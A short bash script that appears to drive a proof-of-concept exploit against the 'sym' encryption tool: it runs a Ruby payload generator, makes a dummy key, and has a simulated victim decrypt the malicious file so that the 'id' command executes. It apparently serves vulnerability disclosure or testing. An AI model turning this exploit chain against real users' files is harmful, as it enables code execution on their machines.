#!/bin/bash

# Generate the malicious encrypted data. It should execute the "id" command 
# on a successful exploit.
echo "[*] Going to generate the malicious data"
ruby payload_generate.rb 2>/dev/null

# Generate a placeholder key. This doesn't even really need to be a real key, we just need to 
# have the command line option set to reach the vulnerable code
echo "[*] Making a dummy key"
sym --generate > key.bin

# Simulate a victim trying to decrypt the malicious data. This should execute the payload on their machine.
echo "[*] Victim tries to decrypt the malicious data now..."
sym -k key.bin -d -f ./payload.bin
